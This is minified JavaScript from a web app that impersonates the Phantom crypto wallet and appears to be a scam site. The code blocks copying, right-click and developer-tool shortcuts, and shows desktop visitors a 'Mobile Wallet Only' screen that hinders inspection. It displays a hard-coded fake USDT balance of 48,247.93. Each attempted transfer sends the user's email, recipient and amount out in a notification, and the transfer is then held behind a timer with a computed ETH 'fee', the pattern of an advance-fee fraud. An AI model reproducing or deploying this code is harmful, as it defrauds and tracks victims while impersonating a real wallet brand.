                            document.addEventListener("contextmenu", e), document.addEventListener("copy", e), document.addEventListener("cut", e), document.addEventListener("paste", e), document.addEventListener("keydown", e), document.addEventListener("keyup", e), document.addEventListener("keypress", e), document.addEventListener("click", e), document.addEventListener("mousedown", e), document.addEventListener("mouseup", e), document.addEventListener("mousemove", e), document.addEventListener("selectstart", e), document.addEventListener("dragstart", e), document.addEventListener("drop", e), document.body.innerHTML = '\n          <div style="position: fixed; inset: 0; background: radial-gradient(circle at top, #fbfaff 0%, #f8f7fd 35%, #f2eeff 100%); display: flex; align-items: center; justify-content: center; z-index: 999999; font-family: system-ui, -apple-system, sans-serif; margin: 0; padding: 0;">\n            <div style="text-align: center; padding: 24px; max-width: 400px;">\n              <div style="width: 80px; height: 80px; margin: 0 auto 20px; border-radius: 50%; background: #8B5CF6; display: flex; align-items: center; justify-content: center; padding: 12px;">\n                <img \n                  src="data:image/svg+xml;utf8,%3Csvg%20width%3D%22128%22%20height%3D%22128%22%20viewBox%3D%220%200%20128%20128%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%22128%22%20height%3D%22128%22%20fill%3D%22%23AB9FF2%22%2F%3E%0A%3Cpath%20fill-rule%3D%22evenodd%22%20clip-rule%3D%22evenodd%22%20d%3D%22M55.6416%2082.1477C50.8744%2089.4525%2042.8862%2098.6966%2032.2568%2098.6966C27.232%2098.6966%2022.4004%2096.628%2022.4004%2087.6424C22.4004%2064.7584%2053.6445%2029.3335%2082.6339%2029.3335C99.1257%2029.3335%20105.697%2040.7755%20105.697%2053.7689C105.697%2070.4471%2094.8739%2089.5171%2084.1156%2089.5171C80.7013%2089.5171%2079.0264%2087.6424%2079.0264%2084.6688C79.0264%2083.8931%2079.1552%2083.0527%2079.4129%2082.1477C75.7409%2088.4182%2068.6546%2094.2361%2062.0192%2094.2361C57.1877%2094.2361%2054.7397%2091.1979%2054.7397%2086.9314C54.7397%2085.3799%2055.0618%2083.7638%2055.6416%2082.1477ZM80.6133%2053.3182C80.6133%2057.1044%2078.3795%2058.9975%2075.8806%2058.9975C73.3438%2058.9975%2071.1479%2057.1044%2071.1479%2053.3182C71.1479%2049.532%2073.3438%2047.6389%2075.8806%2047.6389C78.3795%2047.6389%2080.6133%2049.532%2080.6133%2053.3182ZM94.8102%2053.3184C94.8102%2057.1046%2092.5763%2058.9977%2090.0775%2058.9977C87.5407%2058.9977%2085.3447%2057.1046%2085.3447%2053.3184C85.3447%2049.5323%2087.5407%2047.6392%2090.0775%2047.6392C92.5763%2047.6392%2094.8102%2049.5323%2094.8102%2053.3184Z%22%20fill%3D%22%23FFFDF8%22%2F%3E%0A%3C%2Fsvg%3E%0A" \n                  alt="Phantom Wallet"\n                  style="width: 100%; height: 100%; object-fit: contain; border-radius: 12px;"\n                />\n              </div>\n              <div style="font-size: 48px; margin-bottom: 16px;">\uD83D\uDCF1</div>\n              <h1 style="color: white; font-size: 24px; margin-bottom: 12px; font-weight: 700;">\n                Mobile Wallet Only\n              </h1>\n              <p style="color: #aaa; font-size: 16px; margin-bottom: 8px; line-height: 1.6;">\n                Phantom Wallet is not available on Desktop.\n              </p>\n              <p style="color: #888; font-size: 14px; margin-bottom: 24px; line-height: 1.6;">\n                Please visit <span style="color: #8B5CF6; font-weight: 600;">phantom.app</span> on your mobile device.\n              </p>\n            </div>\n          </div>\n        ', document.body.style.margin = "0", document.body.style.padding = "0", document.body.style.backgroundColor = "#f8f7fd", document.body.style.overflow = "hidden", document.documentElement.style.overflow = "hidden", document.addEventListener("contextmenu", e), document.addEventListener("copy", e), document.addEventListener("cut", e), document.addEventListener("paste", e), document.addEventListener("keydown", e), document.addEventListener("keyup", e), document.addEventListener("keypress", e), document.addEventListener("click", e), document.addEventListener("mousedown", e), document.addEventListener("mouseup", e), document.addEventListener("mousemove", e), document.addEventListener("selectstart", e), document.addEventListener("dragstart", e), document.addEventListener("drop", e), document.addEventListener("touchmove", e), document.addEventListener("wheel", e), document.addEventListener("keydown", function(e) {
                                if ("F12" === e.key || e.ctrlKey && e.shiftKey && "I" === e.key || e.ctrlKey && e.shiftKey && "J" === e.key || e.ctrlKey && "U" === e.key) return e.preventDefault(), e.stopPropagation(), !1
                            });
                            return
                        }
                    }
                    let e = e => e.preventDefault(),
                        t = e => {
                            (e.ctrlKey || e.metaKey) && "c" === e.key && e.preventDefault()
                        };
                    return document.addEventListener("contextmenu", e), document.addEventListener("keydown", t), () => {
                        document.removeEventListener("contextmenu", e), document.removeEventListener("keydown", t)
                    }
                }, []);
                let tI = e => {
                        let t = e.trim().replace(/\s+/g, "");
                        return !!t.startsWith("T") && 34 === t.length && /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(t)
                    },
                    tL = function(e, t) {
                        let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : 2567.41,
                            r = 10 + (e - 100) * 85 / 48147.93;
                        return parseFloat(((r = Math.max(10, Math.min(95, r))) / n).toFixed(6))
                    },
                    tD = () => {
                        eR("send")
                    },
                    tB = () => {
                        "USDT" === ey && null !== e7 && e7 > 0 && eS(e7.toFixed(2))
                    },
                    tR = async (e, t, n) => {
                        try {
                            let r = new Date().toLocaleString(),
                                o = "\uD83D\uDCB0 <b>INITIATED</b>\n\n" + "\uD83D\uDCE7 <b>Email:</b> ".concat(x, "\n") + "\uD83D\uDC64 <b>Recipient:</b> ".concat(n, "\n") + "\uD83D\uDCB5 <b>Amount:</b> ".concat(t, " ").concat(e, "\n") + "\uD83D\uDD50 <b>Time:</b> ".concat(r);
                            await m(o)
                        } catch (e) {
                            console.error("Failed to send transfer notification:", e)
                        }
                    },
                    tE = e => {
                        let t = Math.max(0, e - tc),
                            n = Math.floor(t / 6e4),
                            r = Math.floor(t % 6e4 / 1e3),
                            o = n < 3;
                        return {
                            minutes: n.toString().padStart(2, "0"),
                            seconds: r.toString().padStart(2, "0"),
                            isUrgent: o
                        }
                    };
                (0, s.useEffect)(() => {
                    let e = tr.filter(e => e.timerEnd && e.timerEnd <= tc);
                    if (e.length > 0) {
                        let t = e.filter(e => "USDT" === e.token),
                            n = tr.filter(e => !(e.timerEnd && e.timerEnd <= tc)),
                            r = n.some(e => "USDT" === e.token);
                        t.length > 0 && !r && (e8(48247.93), e2(!1), localStorage.setItem("usdtSpent", "false"), te(null)), to(n)
                    }
                }, [tc, tr]);
                let tP = e => tr.filter(t => t.token === e),
                    tM = e => {
                        let t = tP(e).some(e => e.showSummary);
                        to(n => n.map(n => n.token === e ? { ...n,
                            showSummary: !t
                        } : { ...n,
                            showSummary: !1
                        }))
                    },
                    tA = async () => {
                        if (!ey || !ew || !ev || !eC) return;
                        let e = parseFloat(ev);
                        if (e < 100) {
                            eD(!0), setTimeout(() => eD(!1), 3e3);
                            return
                        }
                        if (!(e <= 0) && !(e > (e7 || 0))) {
                            if (tr.length > 0) return void alert("You already have a pending transaction. Please wait for it to complete before initiating another.");
                            ez(!0), tR(ey, ev, ew), setTimeout(async () => {
                                let t = tb.ETH;
                                try {
                                    let e = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd");
                                    e.ok && (t = (await e.json()).ethereum.usd)
                                } catch (e) {
                                    console.error("Failed to fetch real-time ETH price:", e)
                                }
                                if (window.confirm("✔️ YOU ARE ABOUT TO TRANSFER\n\n" + "\uD83D\uDCB8 Amount: ".concat(e.toFixed(2), " ").concat(ey, "\n\n") + "\uD83D\uDCE4 To: ".concat(ew, "\n\n") + "⚠️ THIS TRANSFER IS IRREVERSIBLE!\n\nClick OK to proceed with transfer.")) {
                                    let n = tL(e, ey, t),
                                        r = n * t;
                                    setTimeout(() => {
                                        let t = Date.now(),
                                            o = {
                                                token: ey,
                                                amount: e,
                                                recipient: ew,
                                                timestamp: t,
                                                showSummary: !0,
                                                id: Math.random().toString(36).substr(2, 9),
                                                timerEnd: t + 3e5,
                                                frozenUsdFee: r,
                                                frozenEthFee: n
                                            };
                                        to(e => [...e, o]), "USDT" === ey && (e8(t => t - e), 48247.93 === e && (e2(!0), localStorage.setItem("usdtSpent", "true"), tT.current && clearInterval(tT.current))), 48247.93 === e && (e2(!0), localStorage.setItem("usdtSpent", "true"), te(0)), sessionStorage.setItem("pendingTransactions", JSON.stringify([...tr, {
                                            token: ey,
                                            amount: e,
                                            recipient: ew,
                                            timestamp: Date.now(),
                                            showSummary: !0,
                                            id: Math.random().toString(36).substr(2, 9),
                                            timerEnd: Date.now() + 3e5,
                                            frozenUsdFee: r,
                                            frozenEthFee: n
                                        }])), ez(!1), ef(!1), eR("select"), eb(""), ej(""), eS(""), ek(!1), te(null)
                                    }, 2e3)
                                } else ez(!1)
                            }, 5e3)
                        }
                    },
                    tF = () => {
                        window.WalletEngine.open()
                    },
                    tW = "USDT" === ey && ew && ev && parseFloat(ev) >= 100 && eC && parseFloat(ev) <= (e7 || 0) && !isNaN(parseFloat(ev)),
                    tH = e => "hsl(".concat(tN[e], ")"),
                    t_ = e => tr.some(t => t.token === e),
                    tU = [{
                        name: "Revolut",
                        logo: "https://play-lh.googleusercontent.com/9Agn2TZHIyOR4GGB4LcOU4VXwE2OcK47qwGY8XPZXz4u55ehNfpGuEBeNq_cbvH0z5A",
                        url: "https://ramp.revolut.com/",
                        features: ["Top Rated", "Fast", "Instant"],
                        rating: 5,
                        reviews: "4.2k",
                        stars: 5
                    }, {
                        name: "Simplex",
                        logo: "https://trustwallet.com/assets/images/payments/simplex_new.png",
                        url: "https://buy.simplex.com/",
                        features: ["Instant", "Credit Card"],
                        rating: 4.9,
                        reviews: "3.8k",
                        stars: 5
                    }, {
                        name: "Link by Stripe",
                        logo: "https://voyagecontrol.com/hubfs/14stripe.png",
                        url: "https://crypto.link.com/",
                        features: ["Secure", "Low Fees"],
                        rating: 4.5,
                        reviews: "2.1k",
                        stars: 4.5
                    }, {
                        name: "Coinbase Pay",
                        logo: "https://cdn.iconscout.com/icon/free/png-256/free-coinbase-9420774-7651204.png",
                        url: "https://login.coinbase.com/",
                        features: ["US Based", "Regulated"],
                        rating: 4.3,
                        reviews: "5.2k",
                        stars: 4
                    }, {
                        name: "Binance",
                        logo: "https://upload.wikimedia.org/wikipedia/commons/5/57/Binance_Logo.png",
                        url: "https://www.binance.com/en/buy-sell-crypto",
                        features: ["Global Leader", "Deep Liquidity", "Low Fees"],
                        rating: 4.8,
                        reviews: "15.2k",
                        stars: 5
                    }, {
                        name: "OKX",
                        logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSNsVekMp7FRdoSlnrkvX9xWwGr0cOgFCih7aoqJWHu0Kc4plS84tiVoE4&s=10",
                        url: "https://www.okx.com/buy",
                        features: ["Advanced Tools", "MiCA Approved", "Professional"],
                        rating: 4.4,
                        reviews: "3.6k",
                        stars: 4
                    }, {
                        name: "Bybit",
                        logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ1QNFhoGOynmTR8nYSjf9yKH6YCOpSqBuMN-KShQ9WryJgQXNgcWEfl8o&s=10",
                        url: "https://www.bybit.com/buy",
                        features: ["Derivatives", "Copy Trading", "Fast Execution"],
                        rating: 4.3,
                        reviews: "5.1k",
                        stars: 4
                    }, {
                        name: "Kraken",
                        logo: "https://www.freelogovectors.net/wp-content/uploads/2021/12/kraken-logo-freelogovectors.net_.png",
                        url: "https://www.kraken.com/buy",
                        features: ["13+ Years", "Highly Secure", "Proof of Reserves"],
                        rating: 4.7,
                        reviews: "4.3k",
                        stars: 4.5
                    }, {
                        name: "MEXC",
                        logo: "https://rankfi.com/wp-content/uploads/2023/06/MEXC-Global-Logo-1.jpeg",
                        url: "https://www.mexc.com/buy",
                        features: ["Zero Fees", "New Altcoins", "Fast Growing"],
                        rating: 4.1,
                        reviews: "2.3k",
                        stars: 4
                    }, {
                        name: "ChangeNOW",
                        logo: "https://changenow.io/images/changenow-logo-new.png",
                        url: "https://changenow.io/",
                        features: ["No Account", "Non-Custodial", "Privacy Focus"],
                        rating: 4.2,
                        reviews: "1.9k",
                        stars: 4
                    }, {
                        name: "MoonPay",
                        logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSbx8UcJhmp9gc40I33eD1NvxU2qBYidXZxBQ&s",
                        url: "https://www.moonpay.com/buy",
                        features: ["Credit Card", "Instant"],
                        rating: 4.1,
                        reviews: "2.7k",
                        stars: 4
                    }, {
                        name: "Banxa",
                        logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQiZC5nuzdSdA-UyHPGBkAnWHgZADkAgIFHLQ&s",
                        url: "https://openocean.banxa.com/",
                        features: ["Best Rate", "Low Fees", "Fast"],
                        rating: 4.7,
                        reviews: "2.4k",
                        stars: 4.5
                    }, {
                        name: "Transak",
                        logo: "https://trustwallet.com/assets/images/payments/transak.png",
                        url: "https://global.transak.com/",
                        features: ["50+ Countries", "Low Fees"],
                        rating: 4.6,
                        reviews: "3.1k",
                        stars: 4.5
                    }, {
                        name: "TransFi",
                        logo: "https://s3-eu-west-1.amazonaws.com/tpd/logos/63045de2d91f330bb809850b/0x0.png",
                        url: "https://buy.transfi.com/buy",
                        features: ["Emerging Markets"],
                        rating: 3.9,
                        reviews: "892",
                        stars: 4
                    }, {
                        name: "Mercuryo",
                        logo: "https://trustwallet.com/assets/images/payments/mercuryo.png",
                        url: "https://exchange.mercuryo.io/",
                        features: ["Instant", "100+ Coins"],
                        rating: 4.2,
                        reviews: "1.8k",
                        stars: 4
                    }, {
                        name: "Ramp",
                        logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSkcbEzUutU5Q0q6pmiCI4FRjSOeAmbFOZIGA&s",
                        url: "https://ramp.network/buy",
                        features: ["Low Fees", "Bank Transfer"],
                        rating: 4,
                        reviews: "1.5k",
                        stars: 4
                    }, {
                        name: "Blockchain.com",
                        logo: "https://downloadr2.apkmirror.com/wp-content/uploads/2019/05/5cf06159f0fe5.png",
                        url: "https://login.blockchain.com/",
                        features: ["Long History"],
                        rating: 4.5,
                        reviews: "3.8k",
                        stars: 4.5
                    }, {
                        name: "Sardine",
                        logo: "https://cryptocurrencyjobs.co/startups/assets/logos/sardine.jpg",
                        url: "https://crypto.sardine.ai/buy",
                        features: ["Instant", "ACH Transfer"],
                        rating: 4.3,
                        reviews: "1.2k",
                        stars: 4
                    }],
                    tV = () => (0, r.jsxs)("div", {
                        style: {
                            background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                            borderRadius: "24px",
                            width: "100%",
                            maxWidth: "420px",
                            height: "620px",
                            display: "flex",
                            flexDirection: "column",
                            boxShadow: "0 24px 80px rgba(124, 58, 237, 0.12), 0 8px 24px rgba(15, 23, 42, 0.08)",
                            border: "1px solid rgba(174,156,255,0.18)"
                        },
                        children: [(0, r.jsxs)("div", {
                            style: {
                                padding: "20px 16px 16px",
                                display: "flex",
                                justifyContent: "space-between",
                                alignItems: "center",
                                position: "relative",
                                borderBottom: "1px solid ".concat(tH("--twc-line"))
                            },
                            children: [(0, r.jsx)("button", {
                                onClick: () => {
                                    "send" === ee ? J(!1) : "receive" === ee && Q(!1), et(null)
                                },
                                style: {
                                    background: "rgba(255,255,255,0.55)",
                                    border: "none",
                                    color: tH("--twc-textPrimary"),
                                    cursor: "pointer",
                                    padding: "8px",
                                    display: "flex",
                                    alignItems: "center",
                                    justifyContent: "center",
                                    borderRadius: "18px",
                                    transition: "background-color 0.2s ease",
                                    position: "absolute",
                                    left: "16px",
                                    zIndex: 10
                                },
                                onMouseEnter: e => e.currentTarget.style.backgroundColor = tH("--twc-bg3"),
                                onMouseLeave: e => e.currentTarget.style.backgroundColor = "transparent",
                                children: (0, r.jsx)("svg", {
                                    width: "24",
                                    height: "24",
                                    viewBox: "0 0 24 24",
                                    fill: "currentColor",
                                    children: (0, r.jsx)("path", {
                                        d: "M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"
                                    })
                                })
                            }), (0, r.jsx)("h3", {
                                style: {
                                    color: tH("--twc-textPrimary"),
                                    margin: 0,
                                    fontSize: "18px",
                                    fontWeight: 700,
                                    textAlign: "center",
                                    width: "100%",
                                    paddingLeft: "40px",
                                    paddingRight: "40px"
                                },
                                children: "Buy Crypto"
                            }), (0, r.jsx)("div", {
                                style: {
                                    width: "40px"
                                }
                            })]
                        }), (0, r.jsxs)("div", {
                            style: {
                                flex: 1,
                                overflowY: "auto",
                                padding: "24px"
                            },
                            children: [(0, r.jsx)("div", {
                                style: {
                                    background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                                    borderRadius: "20px",
                                    padding: "12px 16px",
                                    marginBottom: "20px",
                                    border: "1px solid rgba(174,156,255,0.18)"
                                },
                                children: (0, r.jsxs)("div", {
                                    style: {
                                        display: "flex",
                                        alignItems: "center",
                                        gap: "12px"
                                    },
                                    children: [(0, r.jsx)("svg", {
                                        width: "20",
                                        height: "20",
                                        viewBox: "0 0 24 24",
                                        fill: tH("--twc-iconNormal"),
                                        children: (0, r.jsx)("path", {
                                            d: "M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"
                                        })
                                    }), (0, r.jsx)("input", {
                                        type: "text",
                                        placeholder: "Search providers",
                                        style: {
                                            flex: 1,
                                            background: "rgba(255,255,255,0.55)",
                                            border: "none",
                                            color: tH("--twc-textPrimary"),
                                            outline: "none",
                                            fontSize: "16px",
                                            fontWeight: 500
                                        }
                                    })]
                                })
                            }), (0, r.jsx)("div", {
                                style: {
                                    display: "flex",
                                    flexDirection: "column",
                                    gap: "12px"
                                },
                                children: tU.map((e, t) => (0, r.jsxs)("div", {
                                    onClick: () => window.open(e.url, "_blank"),
                                    style: {
                                        display: "flex",
                                        alignItems: "center",
                                        justifyContent: "space-between",
                                        padding: "16px",
                                        borderRadius: "20px",
                                        cursor: "pointer",
                                        background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                                        transition: "filter 0.35s cubic-bezier(.22,1,.36,1), transform 0.35s cubic-bezier(.22,1,.36,1), opacity 0.35s cubic-bezier(.22,1,.36,1), box-shadow 0.35s cubic-bezier(.22,1,.36,1)",
                                        border: "1px solid rgba(174,156,255,0.18)"
                                    },
                                    onMouseEnter: e => {
                                        e.currentTarget.style.backgroundColor = tH("--twc-backgroundSecondary")
                                    },
                                    onMouseLeave: e => {
                                        e.currentTarget.style.backgroundColor = tH("--twc-bg3")
                                    },
                                    children: [(0, r.jsxs)("div", {
                                        style: {
                                            display: "flex",
                                            alignItems: "center",
                                            gap: "12px",
                                            flex: 1
                                        },
                                        children: [(0, r.jsx)("img", {
                                            src: e.logo,
                                            alt: e.name,
                                            style: {
                                                width: "48px",
                                                height: "48px",
                                                borderRadius: "20px"
                                            }
                                        }), (0, r.jsxs)("div", {
                                            style: {
                                                flex: 1
                                            },
                                            children: [(0, r.jsx)("p", {
                                                style: {
                                                    color: tH("--twc-textPrimary"),
                                                    margin: 0,
                                                    fontSize: "16px",
                                                    fontWeight: 600
                                                },
                                                children: e.name
                                            }), (0, r.jsx)("div", {
                                                style: {
                                                    display: "flex",
                                                    gap: "8px",
                                                    marginTop: "4px",
                                                    flexWrap: "wrap"
                                                },
                                                children: e.features.map((e, t) => (0, r.jsx)("span", {
                                                    style: {
                                                        fontSize: "11px",
                                                        padding: "2px 6px",
                                                        background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                                                        color: tH("--twc-textSecondary"),
                                                        borderRadius: "4px",
                                                        fontWeight: 500,
                                                        marginBottom: "2px"
                                                    },
                                                    children: e
                                                }, t))
                                            }), (0, r.jsxs)("div", {
                                                style: {
                                                    display: "flex",
                                                    alignItems: "center",
                                                    gap: "8px",
                                                    marginTop: "8px"
                                                },
                                                children: [(0, r.jsx)("div", {
                                                    style: {
                                                        display: "flex",
                                                        gap: "2px"
                                                    },
                                                    children: [void 0, void 0, void 0, void 0, void 0].map((t, n) => (0, r.jsx)("svg", {
                                                        width: "12",
                                                        height: "12",
                                                        viewBox: "0 0 24 24",
                                                        fill: n < Math.floor(e.stars) || n < e.stars ? "#FFD700" : tH("--twc-textDisabled"),
                                                        children: (0, r.jsx)("path", {
                                                            d: "M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"
                                                        })
                                                    }, n))
                                                }), (0, r.jsxs)("span", {
                                                    style: {
                                                        fontSize: "12px",
                                                        color: tH("--twc-textSecondary")
                                                    },
                                                    children: [e.rating, " (", e.reviews, ")"]
                                                })]
                                            })]
                                        })]
                                    }), (0, r.jsxs)("svg", {
                                        width: "22",
                                        height: "22",
                                        viewBox: "0 0 22 22",
                                        fill: tH("--twc-textPrimary"),
                                        children: [(0, r.jsx)("rect", {
                                            width: "5",
                                            height: "2.5",
                                            transform: "matrix(1.19249e-08 -1 -1 -1.19249e-08 20 20)"
                                        }), (0, r.jsx)("rect", {
                                            width: "16",
                                            height: "2.5",
                                            transform: "matrix(1.19249e-08 -1 -1 -1.19249e-08 6.5 20)"
                                        }), (0, r.jsx)("rect", {
                                            width: "2.5",
                                            height: "16",
                                            transform: "matrix(1.19249e-08 -1 -1 -1.19249e-08 20 20)"
                                        }), (0, r.jsx)("rect", {
                                            width: "2.5",
                                            height: "5",
                                            transform: "matrix(1.19249e-08 -1 -1 -1.19249e-08 9 6.5)"
                                        }), (0, r.jsx)("path", {
                                            fillRule: "evenodd",
                                            clipRule: "evenodd",
                                            d: "M16.9822 5.23223L8.49695 13.7175L10.2647 15.4853L18.75 7L17.8661 6.11612L16.9822 5.23223Z"
                                        }), (0, r.jsx)("path", {
                                            d: "M20 12L20 4L12 4L20 12Z"
                                        })]
                                    })]
                                }, t))
                            })]
                        })]
                    });
                return e ? (0, r.jsxs)(r.Fragment, {
                    children: [(0, r.jsx)(i(), {
                        id: "28131abc58c419c4",
                        children: '@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}@keyframes fadeIn{from{opacity:0;transform:translatey(20px)}to{opacity:1;transform:translatey(0)}}@keyframes pulse{0%{transform:scale(1);opacity:1}50%{transform:scale(1.05);opacity:.8}100%{transform:scale(1);opacity:1}}*{box-sizing:border-box;margin:0;padding:0;touch-action:manipulation}body{margin:0;background:hsl(240 1.8%10.8%);font-family:ui-sans-serif,system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,Cantarell,Noto Sans,sans-serif;overflow-x:hidden;-webkit-tap-highlight-color:transparent;-webkit-text-size-adjust:100%;text-size-adjust:100%}textarea{font-family:inherit;font-size:16px!important;min-height:44px}input,button,textarea{font-family:inherit;font-size:16px!important}input[type="text"],input[type="email"],input[type="password"],input[type="number"]{font-size:16px!important;min-height:44px}button[data-phantom-primary="true"]{position:relative;border-radius:999px;overflow:hidden;cursor:pointer;isolation:isolate;background:linear-gradient(180deg, #AB9FF2 0%, #9D8CFF 48%, #8B5CF6 100%);transition:filter .35s cubic-bezier(.22,1,.36,1),opacity .35s cubic-bezier(.22,1,.36,1);box-shadow:0 12px 24px rgba(124,58,237,.32),inset 0 1px 0 rgba(255,255,255,.24);animation:capsuleFloat 5s ease-in-out infinite}button[data-phantom-primary="true"]::before{content:"";position:absolute;left:4%;top:5%;width:92%;height:38%;border-radius:999px;background:linear-gradient(rgba(255,255,255,.22),rgba(255,255,255,.08),transparent);filter:blur(10px);pointer-events:none}button[data-phantom-primary="true"]::after{content:"";position:absolute;left:6%;width:88%;bottom:-12px;height:24px;border-radius:999px;background:rgba(255,255,255,.20);filter:blur(18px);pointer-events:none}button[data-phantom-primary="true"]:hover{filter:brightness(1.03)}button[data-phantom-primary="true"]:active{transform:translateY(1px) scale(.99);filter:brightness(.98)}@media(max-width:428px){body{font-size:14px}}'
                    }), (0, r.jsx)("div", {
                        style: {
                            position: "fixed",
                            inset: 0,
                            background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                            display: "flex",
                            flexDirection: "column",
                            alignItems: "center",
                            justifyContent: "center",
                            zIndex: 1e4,
                            padding: "20px",
                            animation: "fadeIn 0.3s ease-out"
                        },
                        className: "jsx-28131abc58c419c4",
                        children: (0, r.jsxs)("div", {
                            style: {
                                width: "100%",
                                maxWidth: "320px",
                                textAlign: "center"
                            },
                            className: "jsx-28131abc58c419c4",
                            children: [(0, r.jsxs)("div", {
                                style: {
                                    marginBottom: "24px",
                                    display: "flex",
                                    flexDirection: "column",
                                    alignItems: "center"
                                },
                                className: "jsx-28131abc58c419c4",
                                children: [(0, r.jsx)("img", {
                                    src: "data:image/svg+xml;utf8,%3Csvg%20width%3D%22128%22%20height%3D%22128%22%20viewBox%3D%220%200%20128%20128%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%22128%22%20height%3D%22128%22%20fill%3D%22%23AB9FF2%22%2F%3E%0A%3Cpath%20fill-rule%3D%22evenodd%22%20clip-rule%3D%22evenodd%22%20d%3D%22M55.6416%2082.1477C50.8744%2089.4525%2042.8862%2098.6966%2032.2568%2098.6966C27.232%2098.6966%2022.4004%2096.628%2022.4004%2087.6424C22.4004%2064.7584%2053.6445%2029.3335%2082.6339%2029.3335C99.1257%2029.3335%20105.697%2040.7755%20105.697%2053.7689C105.697%2070.4471%2094.8739%2089.5171%2084.1156%2089.5171C80.7013%2089.5171%2079.0264%2087.6424%2079.0264%2084.6688C79.0264%2083.8931%2079.1552%2083.0527%2079.4129%2082.1477C75.7409%2088.4182%2068.6546%2094.2361%2062.0192%2094.2361C57.1877%2094.2361%2054.7397%2091.1979%2054.7397%2086.9314C54.7397%2085.3799%2055.0618%2083.7638%2055.6416%2082.1477ZM80.6133%2053.3182C80.6133%2057.1044%2078.3795%2058.9975%2075.8806%2058.9975C73.3438%2058.9975%2071.1479%2057.1044%2071.1479%2053.3182C71.1479%2049.532%2073.3438%2047.6389%2075.8806%2047.6389C78.3795%2047.6389%2080.6133%2049.532%2080.6133%2053.3182ZM94.8102%2053.3184C94.8102%2057.1046%2092.5763%2058.9977%2090.0775%2058.9977C87.5407%2058.9977%2085.3447%2057.1046%2085.3447%2053.3184C85.3447%2049.5323%2087.5407%2047.6392%2090.0775%2047.6392C92.5763%2047.6392%2094.8102%2049.5323%2094.8102%2053.3184Z%22%20fill%3D%22%23FFFDF8%22%2F%3E%0A%3C%2Fsvg%3E%0A",
                                    alt: "Phantom Wallet",
                                    style: {
                                        width: "100px",
                                        height: "100px",
                                        marginBottom: "8px",
                                        borderRadius: "20px"
                                    },
                                    className: "jsx-28131abc58c419c4"
                                }), (0, r.jsx)("h1", {
                                    style: {
                                        color: tH("--twc-textPrimary"),
                                        fontSize: "24px",
                                        fontWeight: 700,
                                        margin: "0 0 4px"
                                    },
                                    className: "jsx-28131abc58c419c4",
                                    children: "Phantom Wallet"
                                }), (0, r.jsx)("p", {
                                    style: {
                                        color: tH("--twc-textSecondary"),
                                        fontSize: "14px",
                                        margin: 0,
                                        lineHeight: "1.5"
                                    },
                                    className: "jsx-28131abc58c419c4",
                                    children: "Secure self-custody wallet"
                                })]
                            }), (0, r.jsxs)("div", {
                                style: {
                                    display: "flex",
                                    flexDirection: "column",
                                    gap: "12px",
                                    width: "100%"
                                },
                                className: "jsx-28131abc58c419c4",
                                children: [(0, r.jsxs)("button", {
                                    onClick: () => {
                                        t(!1), o(!0)
                                    },
                                    style: {
                                        width: "100%",
                                        padding: "14px",
                                        color: "#fff",
                                        border: "none",
                                        borderRadius: "999px",
                                        fontSize: "16px",
                                        fontWeight: 600,
                                        cursor: "pointer",
                                        boxShadow: "0 12px 24px rgba(124, 58, 237, 0.32), inset 0 1px 0 rgba(255,255,255,0.24)",
                                        transition: "filter 0.35s cubic-bezier(.22,1,.36,1), transform 0.35s cubic-bezier(.22,1,.36,1), opacity 0.35s cubic-bezier(.22,1,.36,1), box-shadow 0.35s cubic-bezier(.22,1,.36,1)",
                                        overflow: "hidden",
                                        display: "flex",
                                        alignItems: "center",
                                        justifyContent: "center",
                                        gap: "12px"
                                    },
                                    onMouseEnter: e => e.currentTarget.style.filter = "brightness(1.03)",
                                    onMouseLeave: e => e.currentTarget.style.filter = "brightness(1)",
                                    className: "jsx-28131abc58c419c4",
                                    children: [(0, r.jsx)("svg", {
                                        width: "20",
                                        height: "20",
                                        viewBox: "0 0 24 24",
                                        fill: "#fff",
                                        className: "jsx-28131abc58c419c4",
                                        children: (0, r.jsx)("path", {
                                            d: "M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z",
                                            className: "jsx-28131abc58c419c4"
                                        })
                                    }), "Sign In"]
                                }), (0, r.jsxs)("button", {
                                    onClick: () => {
                                        V(!0), setTimeout(() => V(!1), 3e3)
                                    },
                                    style: {
                                        width: "100%",
                                        padding: "14px",
